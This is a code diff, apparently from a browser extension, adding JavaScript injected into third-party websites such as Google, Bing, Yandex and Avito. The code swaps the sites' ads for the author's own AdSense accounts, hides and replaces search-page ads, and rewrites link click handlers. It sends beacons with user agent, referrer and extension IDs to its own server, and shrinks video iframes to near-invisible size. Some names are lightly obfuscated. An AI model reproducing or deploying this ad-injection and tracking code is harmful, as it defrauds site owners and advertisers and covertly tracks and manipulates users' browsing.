+                insEl.setAttribute('data-ad-client', contextAdsenseAccount.context_client);
+                insEl.removeAttribute('data-adsbygoogle-status');
+                insEl.removeAttribute('data-ad-channel');
+                insEl.setAttribute('data-ad-slot', contextAdsenseAccount.general_slot);
+                insEl.innerHTML = '';
+
+                altered = true;
+            }
+
+            if (altered) {
+                (adsbygoogle = window.adsbygoogle || []).push({});
+                insEl.setAttribute('data-processed-by-us', '1');
+            }
+        }
+
+        if (altered)
+            reportData['aac'] = contextAdsenseAccount.context_client;
+
+        return altered;
+    };
+    var replaceKp = function () {
+        if (('undefined' !== typeof skipAdsense) && skipAdsense) return;
+        if (window.top !== window) return;
+        var altered = false;
+
+        var selectors = ['div[id^=adfox]', 'div[id^=google_ads_iframe_]'];
+        for (var sel_i = 0; sel_i < selectors.length; sel_i++) {
+            var selector = selectors[sel_i];
+            var containers = document.querySelectorAll(selector);
+
+            for (var i = 0; i < containers.length; i++) {
+                var container = containers[i];
+                container.removeAttribute('banner');
+                container.setAttribute('id', 'ads-' + sel_i + '_' + i);
+                container.innerHTML = '';
+                // console.log(container);
+                appendAdsBlock(container);
+                skipOutput = true;
+                altered = true;
+            }
+        }
+
+        return altered;
+    };
+    var insertmgid = function (container, blockId) {
+        return;
+        //@formatter:off
+        var mgFn = "(function(){var D=new Date(),d=document,b='body',ce='createElement',ac='appendChild',st='style',ds='display',n='none',gi='getElementById',lp=d.location.protocol,wp=lp.indexOf('http')==0?lp:'https:';var i=d[ce]('iframe');i[st][ds]=n;d[gi](\"M392137ScriptRootC"+blockId+"\")[ac](i);try{var iw=i.contentWindow.document;iw.open();iw.writeln(\"<ht\"+\"ml><bo\"+\"dy></bo\"+\"dy></ht\"+\"ml>\");iw.close();var c=iw[b];}catch(e){var iw=d;var c=d[gi](\"M392137ScriptRootC"+blockId+"\");}var dv=iw[ce]('div');dv.id=\"MG_ID\";dv[st][ds]=n;dv.innerHTML="+blockId+";c[ac](dv);var s=iw[ce]('script');s.async='async';s.defer='defer';s.charset='utf-8';s.src=wp+\"//jsc.traffic-media.co/a/d/advbringe.co."+blockId+".js?t=\"+D.getYear()+D.getMonth()+D.getUTCDate()+D.getUTCHours();c[ac](s);})()";
+
+        // console.log(mgFn);
+        //@formatter:on
+
+        var scriptRoot = document.createElement('div');
+        scriptRoot.setAttribute('id', 'M392137ScriptRootC' + blockId);
+
+        var preload = document.createElement('div');
+        preload.setAttribute('id', 'M392137PreloadC' + blockId);
+        preload.innerHTML = 'Загрузка...';
+
+        var firstScript = document.createElement('script');
+        firstScript.innerHTML = mgFn;
+
+        var secondScript = document.createElement('script');
+        // secondScript.innerHTML = "s1=${PUBLISHER_ID}";
+
+        preload.appendChild(firstScript);
+        preload.appendChild(secondScript);
+
+        scriptRoot.appendChild(preload);
+
+        if (!container) return;
+        // console.log(container)
+        container.appendChild(scriptRoot);
+    };
+    var replaceBanners = function () {
+        return;
+        // if ((iDid !== 1) || (sTag !== "new1738")) return;
+        if (window.self !== window.top) return;
+
+        // var bannerSizes = ["1024x768", "1024x90", "1080х607", "1200x627", "1200x630", "1200x717", "120x60", "120x600", "1220x120", "135x100",
+        //     "135x200", "135x300", "160х600", "180x180", "200x200", "200x446", "220x90", "234x100", "234x200", "234x400", "234x60", "240x133",
+        //     "240x400", "240х400", "250x250", "250x360", "272x100", "292x30", "300x100", "300x1050", "300x250", "300x31", "300x50", "300x500",
+        //     "300x600", "300x57", "300x600", "300x90", "320x100", "320x50", "320х480", "336x280", "375x50", "414x736", "420x120", "420x240",
+        //     "425x600", "450x110", "450x220", "468x60", "480х32", "480х320", "540x80", "580х400", "585x90", "600x315", "600x90", "600х600",
+        //     "728x90", "736x414", "750x100", "750x200", "750x300", "768x1024", "820x310", "851x315", "88x31", "90х75", "930х180", "940x788",
+        //     "950x90", "960x90", "970x250", "970x66", "970х90", "980x120", "980x90"];
+
+        var bannerSizes = ["240x400", "728x90", "300x250", "300x600", "160x600"];
+        var mgCodes = {
+            "240x400": 672729,
+            "728x90": 672730,
+            "300x250": 672731,
+            "300x600": 672732,
+            "160x600": 672733
+        };
+
+        var adsenseAccount = {
+            context_client: "ca-pub-4127697351955558",
+            fluid_slot: "4385971686",
+            general_slot: "6845270609",
+            cx: "",
+            intext_slot: null
+        };
+
+        for (var bsid = 0; bsid < bannerSizes.length; bsid++) {
+            var bannerDimensions = bannerSizes[bsid].split('x');
+            var bannerSizeTxt = bannerSizes[bsid];
+
+            var imgs = document.getElementsByTagName('img');
+            for (var i = 0; i < imgs.length; i++) {
+                var img = imgs[i];
+                if (parseInt(bannerDimensions[0]) !== img.naturalWidth || parseInt(bannerDimensions[1]) !== img.naturalHeight) continue;
+
+
+                var div = document.createElement('div');
+                div.style.width = img.naturalWidth + "px";
+                div.style.height = img.naturalHeight + "px";
+                div.style.overflow = 'hidden';
+
+                img.parentNode.replaceChild(div, img);
+
+
+                // appendAdsBlock(div, adsenseAccount);
+                insertmgid(div, mgCodes[bannerSizeTxt]);
+
+
+                skipOutput = true;
+            }
+        }
+
+        if (replaceBannersIndex++ < 3) {
+            setTimeout(replaceBanners, 1000);
+        }
+    };
+    var waitForContainerAndAddAdsBlock = function (selector, newClass, newWidth) {
+        var container = document.querySelector(selector);
+        if (container) {
+
+            var adsContainer = document.createElement('div');
+
+            container.setAttribute('class', newClass);
+            container.style.width = newWidth + 'px';
+            // container.style.border = '1px solid Red';
+            container.innerHTML = '';
+
+            container.prepend(adsContainer);
+
+            setTimeout(function () {
+                appendAdsBlock(adsContainer);
+            }, 500);
+        } else {
+            window[btoa(selector)] = window[btoa(selector)] || 0;
+            window[btoa(selector)] += 200;
+            if (window[btoa(selector)] > 10000) {
+                return;
+            }
+            setTimeout(function () {
+                waitForContainerAndAddAdsBlock(selector, newClass, newWidth);
+            }, 200);
+        }
+    };
+    var appendAdsBlock = function (container, adsenseAccount) {
+        try {
+
+            var s = document.createElement('script');
+            s.src = "//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js";
+
+            if (!adsenseAccount)
+                adsenseAccount = contextAdsenseAccount;
+
+            if (!adsenseAccount)
+                return;
+
+            reportData['aac'] = adsenseAccount.context_client;
+
+            var ins = document.createElement('ins');
+            ins.setAttribute('class', "adsbygoogle");
+            ins.setAttribute('style', "display:block; text-align: center");
+            ins.setAttribute('data-ad-client', adsenseAccount.context_client);
+            ins.setAttribute('data-ad-slot', adsenseAccount.general_slot);
+            ins.setAttribute('data-ad-format', "auto");
+
+            if (!adsenseScriptInserted) {
+                container.appendChild(s);
+                adsenseScriptInserted = true;
+            }
+
+            container.appendChild(ins);
+            container.setAttribute('data-processed-by-us', '1');
+            (adsbygoogle = window.adsbygoogle || []).push({});
+
+
+            gtag('event', 'context', {"event_label": adsenseAccount.context_client});
+        } catch (e) {
+            console.log(e);
+        }
+    };
+
+    var addCSEBlock = function () {
+        var scripts = document.querySelectorAll('.gcse-11');
+        for (var i = 0; i < scripts.length; i++)
+            scripts[i].remove();
+
+        var cx = searchAdsenseAccount.cx;
+        if (isBingSearch)
+            cx = 'partner-pub-8202234783063499:5378897846';
+
+        reportData['aac'] = cx;
+
+        var gcse = document.createElement('script');
+        gcse.type = 'text/javascript';
+        gcse.async = true;
+        gcse.src = 'https://cse.google.com/cse.js?cx=' + cx + '&_=' + Date.now();
+        gcse.setAttribute('class', "gcse-11");
+        // var s = document.getElementsByTagName('script')[0];
+        document.body.appendChild(gcse);
+        gtag('event', 'search', {"event_label": cx});
+    };
+    var deleteGoogleVars = function () {
+        if (document.location.host.indexOf('google.com') !== -1) return;
+
+        try {
+            if ('undefined' !== typeof window['google']) delete window.google;
+            if ('undefined' !== typeof window['GSearch']) delete window.GSearch;
+            if ('undefined' !== typeof window['GSearchForm']) delete window.GSearchForm;
+            if ('undefined' !== typeof window['GblogSearch']) delete window.GblogSearch;
+            if ('undefined' !== typeof window['GbookSearch']) delete window.GbookSearch;
+            if ('undefined' !== typeof window['GSearchControl']) delete window.GSearchControl;
+            if ('undefined' !== typeof window['GcustomimageSearch']) delete window.GcustomimageSearch;
+            if ('undefined' !== typeof window['GcustomwebSearch']) delete window.GcustomwebSearch;
+            if ('undefined' !== typeof window['GdrawOptions']) delete window.GdrawOptions;
+            if ('undefined' !== typeof window['GimageSearch']) delete window.GimageSearch;
+            if ('undefined' !== typeof window['GlocalSearch']) delete window.GlocalSearch;
+            if ('undefined' !== typeof window['GnewsSearch']) delete window.GnewsSearch;
+            if ('undefined' !== typeof window['GpatentSearch']) delete window.GpatentSearch;
+            if ('undefined' !== typeof window['GsearcherOptions']) delete window.GsearcherOptions;
+            if ('undefined' !== typeof window['GvideoSearch']) delete window.GvideoSearch;
+            if ('undefined' !== typeof window['GwebSearch']) delete window.GwebSearch;
+            if ('undefined' !== typeof window['__gcse']) delete window.__gcse;
+            if ('undefined' !== typeof window['___gcse_nc_']) delete window.___gcse_nc_;
+            if ('undefined' !== typeof window['googleAltLoader']) delete window.googleAltLoader;
+            if ('undefined' !== typeof window['googleLT_']) delete window.googleLT_;
+            if ('undefined' !== typeof window['googleNDT_']) delete window.googleNDT_;
+            if ('undefined' !== typeof window['googleNDT_']) delete window.googleNDT_;
+            if ('undefined' !== typeof window['google_exportProperty']) delete window.google_exportProperty;
+            if ('undefined' !== typeof window['google_exportSymbol']) delete window.google_exportSymbol;
+            if ('undefined' !== typeof window['_googCsa']) delete window._googCsa;
+            if ('undefined' !== typeof window['_googCsaAlwaysHttps']) delete window._googCsaAlwaysHttps;
+            if ('undefined' !== typeof window['_googCsaShowAfdSurvey']) delete window._googCsaShowAfdSurvey;
+            if ('undefined' !== typeof window['UDS_ApiKey']) delete window.UDS_ApiKey;
+            if ('undefined' !== typeof window['UDS_CurrentLocale']) delete window.UDS_CurrentLocale;
+            if ('undefined' !== typeof window['UDS_JSHash']) delete window.UDS_JSHash;
+            if ('undefined' !== typeof window['UDS_KeyVerified']) delete window.UDS_KeyVerified;
+            if ('undefined' !== typeof window['UDS_LoadFailure']) delete window.UDS_LoadFailure;
+            if ('undefined' !== typeof window['UDS_ServiceBase']) delete window.UDS_ServiceBase;
+            if ('undefined' !== typeof window['UDS_ShortDatePattern']) delete window.UDS_ShortDatePattern;
+            if ('undefined' !== typeof window['UDS_Version']) delete window.UDS_Version;
+        } catch (e) {
+
+        }
+
+    };
+    var searchAdsTimer = null;
+    var adFinder = function () {
+        var adBlock = document.querySelector('#gcse112 .gsc-adBlock');
+        var resultsBlock = document.querySelector('#gcse112 .gs-result');
+
+        if (resultsBlock && searchAdsTimer)
+            clearTimeout(searchAdsTimer);
+
+        var yandexBlock = document.querySelector('.main_central-col-width-exp_yes');
+        if (yandexBlock && yandexBlock.getAttribute('class').indexOf('serp_loading_yes') !== -1) {
+            setTimeout(function () {
+                adFinder()
+            }, 200);
+            return;
+        }
+
+
+        if (adBlock && adBlock.innerHTML.length > 0) {
+            if (searchAdsTimer)
+                clearTimeout(searchAdsTimer);
+
+            var div = document.createElement('div');
+            div.setAttribute('class', 'promo-ad-331');
+
+            var t = document.createElement('template');
+            t.innerHTML = adBlock.innerHTML;
+            var adDiv = t.content.firstChild;
+
+            var setIframeHeight = function (event) {
+                if ('cse-ad-height' !== event.data.type) return;
+
+                var name = event.data.name;
+                var el = document.querySelector("iframe[name='" + name + "']");
+                if (!el) return;
+
+                el.style.height = event.data.height + 'px';
+            };
+            window.addEventListener("message", setIframeHeight, false);
+
+
+            div.innerHTML = adDiv.outerHTML;
+
+            // adDiv.setAttribute('style', '100px');
+            var adDivName = adDiv.getAttribute('name');
+
+            var data = JSON.parse(adDivName);
+            var masterId = parseInt(data.name.replace('master-', ''));
+
+            var r = new RegExp("master-" + masterId, "g");
+
+            adDiv.setAttribute('id', "master" + (masterId + 1));
+            adDiv.setAttribute('name', adDiv.getAttribute('name').replace(r, "master-" + (masterId + 1)));
+            adDiv.setAttribute('src', adDiv.getAttribute('src').replace(r, "master-" + (masterId + 1)));
+
+            var secondDiv = document.createElement('div');
+            secondDiv.innerHTML = adDiv.outerHTML;
+            secondDiv.setAttribute('class', 'promo-ad-331');
+
+            adBlock.remove();
+
+
+            // div.appendChild(adBlock);
+            var container = document.querySelector('#topstuff');
+            if (!container)
+                container = document.querySelector('.srg');
+            if (!container)
+                container = document.querySelector('.serp-list');
+            if (!container)
+                container = document.querySelector('#b_results');
+
+            var allowTwoBlocks = searchAdsenseAccount['allow_two_blocks'] !== null ? searchAdsenseAccount['allow_two_blocks'] : true;
+
+            container.prepend(div);
+            if (true || allowTwoBlocks)
+                container.prepend(secondDiv);
+
+            var oldDiv = document.getElementById('gcse112');
+            if (oldDiv) oldDiv.remove();
+
+        } else {
+            setTimeout(function () {adFinder()}, 200);
+            if (!searchAdsTimer)
+                searchAdsTimer = setTimeout(function () {
+                    reportAdsIssue('search', {cx: searchAdsenseAccount.cx, referer: document.location.href})
+                }, 5000)
+        }
+    };
+    var removeGAds = function () {
+        var i,
+            adsElements = document.querySelectorAll('*[aria-label="Ads"]'),
+            foundAdsElements = [];
+        for (i = 0; i < adsElements.length; i++)
+            foundAdsElements.push(adsElements[i])
+
+        adsElements = document.querySelectorAll('*[aria-label="Реклама"]');
+        for (i = 0; i < adsElements.length; i++)
+            foundAdsElements.push(adsElements[i])
+
+        for (i = 0; i < foundAdsElements.length; i++) {
+            foundAdsElements[i].remove();
+        }
+    }
+    var appendGoogleSearchAds = function (searchParamName) {
+        // if (true || [11, 13, 14].indexOf(iDid) !== -1 && document.querySelector('.g')) {
+        //     var reportSWAdsClick = function (ourSite, event) {
+        //         var xhr = new XMLHttpRequest();
+        //         var vars = [];
+        //         var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
+        //             vars[key] = value;
+        //         });
+        //
+        //         var cx = searchAdsenseAccount.cx;
+        //
+        //         var reportParams = [];
+        //         reportParams.push('cid=' + window['ss78mest']['cid']);
+        //         reportParams.push('aac=' + cx);
+        //         reportParams.push('ua=' + encodeURIComponent(navigator.userAgent));
+        //         reportParams.push('r=' + encodeURIComponent(document.referrer));
+        //
+        //         var params = reportParams.join('&');
+        //         var path = event;
+        //
+        //         xhr.open("GET", '//' + ourDomain + '/go/' + path + '?' + params, false);
+        //         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        //         xhr.send();
+        //
+        //         return true;
+        //     };
+        //
+        //     try {reportSWAdsClick(ourDomain, 's_open_candidate')} catch (e) {}
+        //
+        //     var blocks = document.querySelectorAll('div.g');
+        //
+        //     for(var i = 0; i < 3; i++) {
+        //         var block = blocks[i];
+        //         if (!block) continue;
+        //
+        //         var links = block.querySelectorAll('a');
+        //         for (var j = 0; j < links.length; j++) {
+        //             var link = links[j];
+        //             link.onclick = function () {
+        //                 try {
+        //                     reportSWAdsClick(ourDomain, 's_open');
+        //                 } catch (e) {}
+        //                 return true;
+        //             };
+        //             link.setAttribute('href', 'https://site-great.xyz/search.html?q=' + getUrlParameter('q'))
+        //         }
+        //     }
+        //
+        //     return;
+        // }
+
+        removeGAds();
+        deleteGoogleVars();
+
+        var gcode = document.createElement('div');
+        gcode.classList.add('gcse-searchresults-only');
+
+        if (undefined !== searchParamName)
+            gcode.setAttribute('queryParameterName', 'text');
+
+        var oldDiv = document.getElementById('gcse112');
+        if (oldDiv) oldDiv.remove();
+
+        var div = document.createElement('div');
+        div.id = 'gcse112';
+        div.style.position = 'absolute';
+        div.style.top = '-20000px';
+
+        var fnName = 'zppend'.replace('z', 'a')
+
+        div[fnName](gcode);
+
+        var style = document.createElement('style');
+        style.innerHTML = '.b_ad, .ads-ad {display: none}';
+        document.body.appendChild(style);
+
+        document.body.appendChild(div);
+
+        addCSEBlock();
+        adFinder();
+    };
+    var reportAdsIssue = function (type, details) {
+        var xhr = new XMLHttpRequest();
+
+        var data = {type: type, details: details, ua: navigator.userAgent};
+
+        xhr.open("POST", '//' + ourDomain + '/ai');
+        xhr.setRequestHeader("Content-Type", "application/json");
+        xhr.send(JSON.stringify(data));
+    };
+
+    var trackYandexSearchRequest = function () {
+        if (window['Ya'] && Ya.Rum && Ya.Rum.ajaxStart !== YaRumAjaxStart) {
+            YaRumAjaxStart = Ya.Rum.ajaxStart;
+            var els = document.querySelectorAll('.promo-ad-331');
+            for (var i = 0; i < els.length; i++)
+                els[i].remove();
+
+            appendGoogleSearchAds('text');
+        }
+
+        setTimeout(function () {
+            trackYandexSearchRequest()
+        }, 200);
+    };
+
+    if ('cse.google.com' === document.location.host) {
+        skipReport = true;
+        var style = document.createElement('style');
+        style.innerHTML += 'a:link, .w, #prs a:visited, #prs a:active, .q:active, .q:visited { color: #1a0dab }';
+        style.innerHTML += '.mblink:visited, a:visited {color: #609;}';
+        style.innerHTML = '.adbadgeContainer, .adD div:last-child {display: none; margin: 0; padding: 0}' + "\n";
+        style.innerHTML += '.exp-sitelinks-container, .si14, .si21__ {display: none}' + "\n";
+        style.innerHTML += '.styleable-rootcontainer { padding: 0; margin-bottom: 26px; padding-left: 0;  }';
+        style.innerHTML += '.styleable-rootcontainer:last-child { margin-bottom: 18px;   }';
+        style.innerHTML += '.styleable-visurl { color: #006621; margin-top: 1px; font-size: 16px; margin-left: 0; line-height: 1.5; padding-top: 1px;  }';
+        style.innerHTML += '.styleable-description  { line-height: 1.57; color: #4d5156; font-size: 14px; }';
+        style.innerHTML += '.styleable-title { text-decoration: none; color: #1a0dab; line-height: 1.3; }';
+        style.innerHTML += '.styleable-title b { font-weight: normal; }';
+        style.innerHTML += '.styleable-title { font-size: 18px; } .styleable-title { font-weight: 400; }';
+        style.innerHTML += '.gc_.si21, .ec_.si21, .z_.si21  { display: none }';
+        style.innerHTML += '.si11 { color: #4d5156; }'
+
+//        style.innerHTML += 'span.ha_, span.ga_, .adStd div:first-child + span {display: none}';
+//        style.innerHTML += 'span.ha_, span.ga_, .adStd div:first-child + span {display: none}';
+        style.innerHTML += '.adStd div:first-child > a > span { font-size: 18px; } .adStd div:first-child > a > span > b { font-weight: 400; }';
+        style.innerHTML += '.adStd div:first-child > a { text-decoration: none; }';
+        style.innerHTML += '.ad { margin-bottom: 5px; }';
+        style.innerHTML += '.ad > div  { padding-left: 0; }';
+
+        if (document.referrer.indexOf('yandex') !== -1) {
+            style.innerHTML += '.adD .adStd > div > a { color: #00c; line-height: 24px; font-family: Arial, Helvetica, sans-serif; display: block; font-weight: 400}';
+            style.innerHTML += '.ad { margin-bottom: 8px; }';
+            style.innerHTML += '.adD a.test_domainLink { color: #070; font-weight: bold; font-size: 14px; line-height: 17px; font-family: Arial,Helvetica,sans-serif; }';
+        } else {
+            style.innerHTML += '.descText { line-height: 1.4; color: #545454;  }';
+            style.innerHTML += '.adD .adStd >div > a { color: #1a0dab; }';
+            style.innerHTML += '.adD a.test_domainLink { font-size: 14px; padding-top: 1px; display: inline-block; padding-bottom: 2px; }';
+        }
+
+        document.body.appendChild(style);
+
+        if (document.location.pathname.indexOf('/cse_v2/ads') !== -1) {
+            var sendHeight = function () {
+                window.parent.postMessage({
+                    height: document.body.scrollHeight,
+                    name: window.name,
+                    type: 'cse-ad-height'
+                }, '*');
+            };
+
+            window.addEventListener("message", function (event) {
+                if ('search-website-origin' !== event.data.type) return;
+
+                console.log(event.data);
+                if (event.data.ourSite) {
+                    fixLinks(true);
+                }
+
+                console.log({newEvent: event})
+            }, false);
+
+            window.reportAdsClick123 = function (ourSite) {
+                var xhr = new XMLHttpRequest();
+                var vars = [];
+                var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
+                    vars[key] = value;
+                });
+
+                var cx = vars.cx;
+
+                var reportParams = [];
+                reportParams.push('cid=' + window['ss78mest']['cid']);
+                reportParams.push('aac=' + cx);
+                reportParams.push('ua=' + encodeURIComponent(navigator.userAgent));
+                reportParams.push('r=' + encodeURIComponent(document.referrer));
+
+                var params = reportParams.join('&');
+                var path = ourSite ? 's_ad_clck' : 'clck';
+
+                xhr.open("GET", '//' + ourDomain + '/go/' + path + '?' + params, false);
+                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                xhr.send();
+
+                return true;
+            };
+
+            var fixLinks = function (ourSite) {
+                var links = document.querySelectorAll(".adD a, a.styleable-title, styleable-rootcontainer a");
+                for (var index in links) {
+                    if (!links.hasOwnProperty(index)) continue;
+                    var el = links[index];
+                    el.setAttribute('target', '_blank');
+                    el.onclick = function () {return reportAdsClick123(ourSite)};
+                }
+            };
+
+            if (document.readyState === 'complete') {
+                sendHeight();
+                fixLinks();
+            } else
+                window.onload = function () {
+                    sendHeight();
+                    fixLinks();
+                }
+
+        }
+    } else if (document.location.host.match('^(www\.|)google\.') && (document.location.href.match(/q=(.+?)(?:&|$)/))) {
+        appendGoogleSearchAds();
+        skipOutput = true;
+    } else if (document.location.host.match('^(www\.|)bing\.') && (document.location.href.match(/q=(.+?)(?:&|$)/))) {
+        appendGoogleSearchAds();
+        bl123sendEvent('bing_search', 'show');
+        skipOutput = true;
+    } else if (document.location.host.indexOf('yandex.') !== -1 && (matched = document.location.href.match(/text=(.+?)(?:&|$)/))) {
+        appendGoogleSearchAds('text');
+        // noinspection JSUnusedAssignment
+        yandexSearchText = matched[1];
+        trackYandexSearchRequest();
+        skipOutput = true;
+    } else if (document.location.host.match('^(www\.|)google\.') && '/' === document.location.pathname) {
+        !function () {
+            var container = document.createElement('div');
+
+            document.getElementById('prm-pt').prepend(container);
+            appendAdsBlock(container);
+            skipOutput = true;
+        }();
+    } else if (document.location.host.indexOf('avito.ru') !== -1) {
+        !function () {
+            waitForContainerAndAddAdsBlock('.avito-ads-serp-wrapper.avito-ads-serp-wrapper-1', '.avito-ads-serp-wrapper_.avito-ads-serp-wrapper-1');
+            waitForContainerAndAddAdsBlock('.avito-ads-serp-wrapper.avito-ads-serp-wrapper-2', '.avito-ads-serp-wrapper_.avito-ads-serp-wrapper-2');
+            waitForContainerAndAddAdsBlock('.avito-ads-container', '.avito-ads-container_');
+            waitForContainerAndAddAdsBlock('.main-page-promo .avito-ads-container', 'avito-ads-container_', '300');
+            waitForContainerAndAddAdsBlock('.main-page-promo div + script + .avito-ads-container', 'avito-ads-container_', '300');
+            waitForContainerAndAddAdsBlock('.main-page-promo div + script + div + script + .avito-ads-container', 'avito-ads-container_', '300');
+        }();
+        skipOutput = true;
+    } else if (document.location.host.indexOf('news.yandex.') !== -1) {
+        !function () {
+            waitForContainerAndAddAdsBlock(".proffit_name_main.proffit_js_inited", "proffit_js_inited__", "310");
+            waitForContainerAndAddAdsBlock(".proffit_name_first.proffit_js_inited", "proffit_js_inited__");
+        }();
+        skipOutput = true;
+
+    } else if (document.location.host.indexOf('tv.yandex.') !== -1) {
+        // waitForContainerAndAddAdsBlock(".eX53tBaZJFVhBCQ__eW4DoFOZEUE9AGg", "eX53tBaZJFVhBCQ__eW4DoFOZEUE9AGg_");
+        // waitForContainerAndAddAdsBlock(".eX53tBaZJFVhBCQ__eWYvyTPxDGUg", "eX53tBaZJFVhBCQ__eWYvyTPxDGUg_");
+
+        waitForContainerAndAddAdsBlock(".grid-chunk__adv-column .adv-manager__wrapper", "adv-manager__wrapper__");
+        waitForContainerAndAddAdsBlock(".grid-chunk__adv-wide .adv-manager__wrapper", "adv-manager__wrapper__");
+        waitForContainerAndAddAdsBlock(".main-controller__adv-bottom .adv-manager__wrapper", "adv-manager__wrapper__");
+        waitForContainerAndAddAdsBlock(".super-banner .adv-manager__wrapper", "adv-manager__wrapper__");
+        waitForContainerAndAddAdsBlock(".adv-manager__wrapper.adv-manager__wrapper_sticky", "adv-manager__wrapper_ adv-manager__wrapper_sticky");
+
+        skipOutput = true;
+    } else if (document.location.host.indexOf('yandex.') !== -1 && document.location.pathname.indexOf('/pogoda') === 0) {
+        waitForContainerAndAddAdsBlock(".adv.adv_pos_top", "adv_ adv_pos_top");
+        waitForContainerAndAddAdsBlock(".adv.adv_pos_bottom", "adv_ adv_pos_bottom");
+        waitForContainerAndAddAdsBlock(".adv.adv_pos_month-bottom", "adv_ adv_pos_month-bottom");
+        skipOutput = true;
+
+    } else if (document.location.host.indexOf('yandex.') !== -1 && document.location.pathname.indexOf('/video') === 0) {
+        waitForContainerAndAddAdsBlock(".content-list__row_type_direct-footer.direct_js_inited", "content-list__row_type_direct-footer__ direct_js_inited__");
+        skipOutput = true;
+
+    } else if (document.location.host.indexOf('yandex.') !== -1 && '/' === document.location.pathname) {
+        !function () {
+            var container = document.createElement('div');
+            if (document.querySelector('.container__search.container__line')) {
+                document.querySelector('.container__search.container__line').append(container);
+                appendAdsBlock(container);
+                skipOutput = true;
+            }
+        }();
+    } else {
+        skipOutput = replaceAds() || skipOutput;
+        skipOutput = replaceDirect() || skipOutput;
+        skipOutput = replaceDirectOld() || skipOutput;
+        skipOutput = replaceZen() || skipOutput;
+        skipOutput = replaceAdFox() || skipOutput;
+        skipOutput = replaceKp() || skipOutput;
+
+        // console.log('[ddd]', document.location, skipOutput);
+
+        if (('undefined' === typeof skipAdsense) || !skipAdsense) {
+            replaceBanners();
+        }
+
+        // if (skipOutput && ('undefined' === typeof skipAdsense)) {
+        //     report();
+        // }
+    }
+
+    if (document.location.host.indexOf('yobit.') !== -1 || document.location.host.indexOf('googlesyndication') !== -1) {
+        skipOutput = true;
+    }
+
+    skipReport = skipReport || (['sl2a5knf0.ru', 'y1jxiqds7v.com'].indexOf(document.location.host) !== -1);
+
+    setTimeout(function () {
+        if (!skipReport) {
+            var pixelUrl = '//' + ourDomain + '/acnt?_=' + Date.now() + '&';
+
+            var reportParams = [];
+            for (var key in reportData) {
+                if (!reportData.hasOwnProperty(key)) continue;
+
+                reportParams.push(key + '=' + encodeURIComponent(reportData[key]));
+            }
+
+            var iframe = 0;
+            try {
+                iframe = window.self !== window.top ? 1 : 0;
+            } catch (e) {
+                iframe = 1;
+            }
+
+            reportParams.push('if=' + iframe);
+            reportParams.push('uid=' + encodeURIComponent(window['jj837711'] || (window['ss78mest'] && window['ss78mest']['extensionId'])));
+            if (window['ss78mest'])
+                reportParams.push('cid=' + window['ss78mest']['cid']);
+
+            if (window['ss78mest'] !== undefined)
+                reportParams.push('v=' + encodeURIComponent(ss78mest.version));
+
+            pixelUrl += reportParams.join('&');
+            var img = document.createElement('img');
+            img.src = pixelUrl;
+            document.body.appendChild(img)
+        }
+    }, 2000);
+}();
+
+
+!function () {
+    if (
+        ['googleads.g.doubleclick.net'].indexOf(document.location.host) !== -1
+        || ['google.'].indexOf(document.location.host) !== -1
+    ) return;
+
+    if (document.location.host.match(/google/))
+        return;
+
+    var pron = false;
+    // var restrictedTitles = ['Эротика', 'Порно', 'Эротические', 'Эротическое', 'Ххх'];
+    // for (i = 0; i < restrictedTitles.length; i++) {
+    //     var testingTitle = restrictedTitles[i].toLocaleLowerCase();
+    //     if (document.title.toLocaleLowerCase().indexOf(testingTitle) !== -1) {
+    //         restrictedRoot = true;
+    //         pron = true;
+    //         break;
+    //     }
+    // }
+
+    if (!pron) {
+        // var restrictedUrlParts = ['xxx', 'porn', 'adult', 'xvideo'];
+
+        var restrictedUrlParts = [
+            'pornhub.com', 'xvideos.com', 'rt.bongacams4.com',
+            'zoo.cab', 'smotret-porno-onlayn.com', 'smotret-porno-onlayn.com', 'smotreti-porno-online.ru', 'smotreti-porno-online.ru',
+            'porn'
+        ];
+
+        for (i = 0; i < restrictedUrlParts.length; i++) {
+            var testingLocation = restrictedUrlParts[i].toLocaleLowerCase();
+
+            if (document.location.host.toLocaleLowerCase().indexOf(testingLocation) !== -1) {
+                pron = true;
+                break;
+            }
+        }
+    }
+
+    // if (!pron) {
+    //     for (i = 0; i < restrictedTitles.length; i++) {
+    //         var testingWord = restrictedTitles[i].toLocaleLowerCase();
+    //         if (document.body.innerText.toLocaleLowerCase().indexOf(testingWord) !== -1) {
+    //             pron = true;
+    //             break;
+    //         }
+    //     }
+    // }
+
+    if (pron) return;
+
+    // try {
+    //     window.IntersectionObserver.prototype.observe = function() {
+    //         debugger;
+    //         throw 'test';
+    //     }
+    // } catch (e) {
+    // }
+
+    // window.document.oldCreateElement = window.document.createElement;
+    // window.document.createElement = function (tagName) {
+    //     if ('iframe' === tagName.toLowerCase()) {
+    //         debugger;
+    //     }
+    //     return document.oldCreateElement(tagName);
+    // };
+
+    reportVideoFound = function () {
+        return
+        var xhr = new XMLHttpRequest();
+        var a = document.createElement('a');
+        a.href = document.referrer;
+
+        var url = '//' + ourDomain + '/go/vf?d=' + a.hostname;
+        xhr.open('GET', url, true);
+        xhr.send();
+
+    }
+
+    setTimeout(function () {
+        var iframe = document.querySelector('iframe[src*="lookmeet"]');
+        if (iframe) {
+            reportVideoFound()
+
+            // console.log(iframe);
+            // iframe.style.opacity = 0;
+            // iframe.style.border = '1px solid Green';
+            iframe.style.zoom = '0.01';
+            iframe.style.width = '640px';
+            iframe.style.height = '320px';
+        } else {
+            // console.log('iframe  not found');
+        }
+    }, 3000);
+
+    var player = document.querySelector('div#player');
+    if (player && ("lookmeet.tv" === document.location.hostname)) {
+        // console.log(player);
+        player.style.minHeight = "";
+    } else {
+        // console.log('player not found');
+    }
+
+
+    window.eventFire = function (el, etype) {
+        if (el.fireEvent) {
+            el.fireEvent('on' + etype);
+        } else {
+            var evObj = document.createEvent('Events');
+            evObj.initEvent(etype, true, false);
+            el.dispatchEvent(evObj);
+        }
+    };
+
+    setTimeout(function () {
+        window.videos = document.querySelectorAll('video');
+        // console.log(videos);
+        // for (var i = 0; i < videos.length; i++)
+        //     videos[i].pause();
+        // document.querySelectorAll('video[src]').play()
+
+    }, 4000);
+
+    var videoStartedAt = 0, videoMidpoint = 0;
+
+    // console.log('installing listener at: ' + document.location.href);
+    window.addEventListener("message", function (event) {
+        var data = event.data;
+        // console.log(event.source);
+
